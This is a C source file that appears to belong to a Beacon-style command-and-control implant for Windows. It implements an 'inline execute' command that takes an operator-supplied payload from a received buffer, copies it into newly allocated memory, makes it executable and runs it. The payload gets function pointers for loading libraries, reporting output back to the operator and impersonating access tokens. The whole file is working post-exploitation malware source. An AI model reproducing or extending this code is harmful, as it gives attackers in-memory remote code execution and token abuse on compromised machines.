#include <windows.h>
#include <stdio.h>
#include "commands.h"
#include "beacon.h"
#include "parse.h"

#include "inlinecommon.h"

extern HANDLE atoken;

void __stdcall postmsgf(int type, char * fmt, ...) {
	char buff[2048];
	va_list va;

	memset(buff, 0, 2048);

	va_start(va, fmt);
	vsprintf_s(buff, 2048, fmt, va);
	va_end(va);

	command_shell_callback(buff, (int)strlen(buff), type);
}

void __stdcall postmsg(char * buffer, int length, int type) {
	command_shell_callback(buffer, length, type);
}

void __stdcall posterrord(int error, int msg) {
	post_error_d(error, msg);
}

BOOL __stdcall use_tokenzz(HANDLE token, char * name, DWORD nlen) {
	/* the canonical implementation lives in tokens.cpp (use_token); this
	 * __stdcall trampoline only exists for the BEACON_FUNCS table */
	return use_token(token, name, nlen);
}

BOOL inline_execute(char * payload, DWORD plength, char * arg, DWORD alength) {
	void(__stdcall *inlinefunc)(BEACON_FUNCS *);
	BEACON_FUNCS foo;
	char    * execpatch;

	/* setup our foo object */
	foo.LoadLibraryA     = LoadLibraryA;
	foo.GetModuleHandleA = GetModuleHandleA;
	foo.GetProcAddress   = GetProcAddress;
	foo.report           = postmsg;
	foo.reportf          = postmsgf;
	foo.errord           = posterrord;
	foo.UseToken         = use_tokenzz;
	foo.args             = arg;
	foo.alen             = alength;

	/* init and copy over to it (RW -> copy -> RX: never RWX) */
	execpatch = (char *)VirtualAlloc(NULL, plength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (execpatch == NULL)
		return FALSE;

	/* copy payload to our area */
	memcpy(execpatch, payload, plength);

	/* cast our inline func, please */
	inlinefunc = (void(__stdcall*)(BEACON_FUNCS*))execpatch;

	/* code is complete: drop to RX before we execute it */
	{
		DWORD old = 0;
		if (!VirtualProtect(execpatch, plength, PAGE_EXECUTE_READ, &old)) {
			VirtualFree(execpatch, plength, MEM_RELEASE);
			return FALSE;
		}
		FlushInstructionCache(GetCurrentProcess(), execpatch, plength);
	}

	/* call it */
	inlinefunc(&foo);

	/* OK, cleanup! */
	VirtualFree(execpatch, plength, MEM_RELEASE);

	return foo.result;
}

/* inline execute */
void command_inline_execute(char * buffer, int length) {
	datap     parser;
	char *    args;
	char *    payload;
	DWORD     plength;
	DWORD     alength;

	data_init(&parser, buffer, length);

	/* grab our arg; packed as len[4b]data[len] */
	alength = data_int(&parser);
	args    = data_ptr(&parser, alength);

	/* grab our payload which is just the rest of the buffer content */
	payload = data_buffer(&parser);
	plength = data_length(&parser);

	inline_execute(payload, plength, args, alength);
}